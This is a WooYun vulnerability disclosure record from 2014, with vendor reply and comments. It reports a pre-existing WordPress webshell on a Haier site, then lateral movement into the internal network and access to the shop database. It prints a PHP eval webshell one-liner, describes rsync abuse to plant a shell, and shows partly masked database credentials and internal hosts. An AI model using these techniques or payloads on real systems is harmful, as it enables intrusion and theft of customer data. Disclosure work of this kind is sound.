{"id": 47691, "wybug_id": "wooyun-2014-085777", "wybug_title": "海尔某遗留问题导致可访问商城主库", "wybug_corp": "海尔集团", "wybug_author": "s0mun5", "wybug_date": "2014-12-03 21:02", "wybug_open_date": "2015-01-17 21:04", "wybug_type": "内部绝密信息泄漏", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-17：\t细节向公众公开  简要描述： 海尔某遗留问题进入内网 加之 内网防护过于薄弱 可导致商城用户、订单库泄露 详细说明：  http://zixun.ehaier.com/ 为wordpress搭建对之前常见批量getshell特征匹配 成功找到一个后门http://zixun.ehaier.com/wp-content/themes/radius/404.php\n\n后门创建时间为13-7-21\n<?php @eval($_POST['pass']);?>\n典型的php一句话如果进行过查杀很容易发现\nuname -aLinux zixun-01.hst.ehaieridc.net 2.6.18-128.el5xen #1 SMP Wed Dec 17 12:01:40 EST 2008 x86_64 x86_64 x86_64 GNU/Linux\n内核版本比较老 可以直接进行提权\n\n\n\n   漏洞证明：  对网络基本结构进行分析\n\n发现基本通信都是在10.9.10.1/24网段进行本机已经安装了nmap，使用nmap对c段进行基本扫描经过筛选发现 10.9.10.135 开启了rsync未授权访问\n\nweb访问 10.9.10.135 开启了 401认证由于rsync可写 下载.htpasswd 然后添加一个用户test:123456登陆成功。然后同步一个shell上去，成功getshell。\n\n\n\n内核版本与上一台一样，同样可以提权，不再证明。登陆时发现这web的功能是统计网站数据，包含用户、订单、访问等等猜测有连接数据库的关键文件查找配置文件，找到main_pro.php果然发现很多数据库配置\n'db'=>array(\t\t\t'class' => 'CDbConnection', \t\t\t'connectionString' => 'mysql:host=10.9.10.61;dbname=db_mnt',\t\t\t'emulatePrepare' => true,\t\t\t'username' => 'imgfilter',\t\t\t'password' => '*********',\t\t\t'charset' => 'utf8',\t\t\t'tablePrefix' => '',\t\t),\t\t'db_mobile_mnt'=>array(\t\t\t'class' => 'CDbConnection', \t\t\t'connectionString' => 'mysql:host=my-cps-wrt.vip.ehaieridc.net;dbname=db_mobile_mnt',\t\t\t'emulatePrepare' => true,\t\t\t'username' => 'report',\t\t\t'password' => '*********',\t\t\t'charset' => 'utf8',\t\t\t'tablePrefix' => '',\t\t),\t\t'db_analysis' =>array(\t\t\t'class' => 'CDbConnection', \t\t\t'connectionString' => 'mysql:host=my-cps-wrt.vip.ehaieridc.net;dbname=ehaier_analysis_db',\t\t\t'emulatePrepare' => true,\t\t\t'username' => 'report',\t\t\t'password' => '*********',\t\t\t'charset' => 'utf8',\t\t\t'tablePrefix' => 'tbl_',\t\t),\t\t'data_analysis' =>array(\t\t\t'class' => 'CDbConnection', \t\t\t'connectionString' => 'mysql:host=my-cps-wrt.vip.ehaieridc.net;dbname=data_analysis',\t\t\t'emulatePrepare' => true,\t\t\t'username' => 'report',\t\t\t'password' => '*********',\t\t\t'charset' => 'utf8',\t\t\t'tablePrefix' => '',\t\t),\t\t'db_shop' =>array(\t\t\t'class' => 'CDbConnection', \t\t\t'connectionString' => 'mysql:host=my-www-rnd.vip.ehaieridc.net;dbname=Shop',\t\t\t'emulatePrepare' => true,\t\t\t'username' => 'pec',\t\t\t'password' => '*********',\t\t\t'charset' => 'utf8',\t\t\t'tablePrefix' => '',\t\t),\t\t'db_shopattributes' =>array(\t\t\t'class' => 'CDbConnection', \t\t\t'connectionString' => 'mysql:host=my-www-rnd.vip.ehaieridc.net;dbname=ShopAttributes',\t\t\t'emulatePrepare' => true,\t\t\t'username' => 'pec',\t\t\t'password' => '*********',\t\t\t'charset' => 'utf8',\t\t\t'tablePrefix' => '',\t\t),\t\t'db_stock' =>array(\t\t\t'class' => 'CDbConnection', \t\t\t'connectionString' => 'mysql:host=my-cbs-rnd.vip.ehaieridc.net;dbname=db_stock',\t\t\t'emulatePrepare' => true,\t\t\t'username' => 'cbs_stock_ro',\t\t\t'password' => '**********D)(]*********[zdF',\t\t\t'charset' => 'utf8',\t\t\t'tablePrefix' => '',\t\t),\t\t'db_eis' =>array(\t\t\t'class' => 'CDbConnection', \t\t\t'connectionString' => 'mysql:host=my-cbs-wrt.vip.ehaieridc.net;dbname=db_eis',\t\t\t'emulatePrepare' => true,\t\t\t'username' => 'cbs_eis_ser',\t\t\t'password' => 'cBs*{*********',\t\t\t'charset' => 'utf8',\t\t\t'tablePrefix' => '',\t\t),\t\t'db_mobile' =>array(\t\t\t'class' => 'CDbConnection', \t\t\t'connectionString' => 'mysql:host=my-shop-rnd.vip.ehaieridc.net;dbname=m_shop',\t\t\t'emulatePrepare' => true,\t\t\t'username' => 'm_shop_ro',\t\t\t'password' => '*********',\t\t\t'charset' => 'utf8',\t\t\t'tablePrefix' => '',\t\t),\n连接'connectionString' => 'mysql:host=my-www-rnd.vip.ehaieridc.net;dbname=Shop',的数据库\n\n\n\n用户473w为了验证是线上数据库 我注册了一个账号 在数据库中马上查到了\n\n\n\n订单\n\n\n\n黑客入侵内网  无非就是想要这些 已经没有必要继续深入   修复方案：  边界安全做好 经常对服务器进行体检内网安全一样要做好   版权声明：转载请注明来源 s0mun5@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-12-04 16:11 厂商回复： 感谢s0mun5与乌云平台的测试与提醒，我方已安排人员进行处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-04 09:01 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  没人捧场吗？    \n     2014-12-04 09:11 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  闪电在哪里？    \n     2014-12-04 16:34 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  楼上你们2位，谁允许你们这么高rank 的！！！哼    \n     2014-12-04 22:50 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  楼上的三位 ,谁允许你们这么高rank 的！！！哼     \n     2014-12-04 23:55 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  楼上都是大牛    \n     2014-12-05 11:02 |    \t\tHonker红颜 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:51        | 皖南人士,90后宅男,自学成才,天朝教育失败....)\t\t \n  楼上都是大牛    \n     2015-01-17 21:28 |    \t\t李宇航的小柠檬 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 小柠檬甜不甜)\t\t \n  我是大牛233333    \n     2015-01-17 22:43 |    \t\t曙光的希望 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 曙光的希望)\t\t \n  能不能给我个wordpress漏洞工具 谢了。。。    \n     2015-03-02 08:49 |    \t\t阿里阿里 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 来打酱油的)\t\t \n  对之前常见批量getshell特征匹配,这个是怎么操作的啊？    \n     2015-03-11 16:58 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  怎样用菜刀连上内网135机器的？    \n     2015-03-12 09:13 |    \t\ts0mun5  \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:24        | .)\t\t \n  @luwikes 代理出来了    \n     2015-03-12 09:14 |    \t\ts0mun5  \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:24        | .)\t\t \n  @阿里阿里 wp写shell 很多人写到主题的404里。用常用webshell密码post几个包就可以了。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}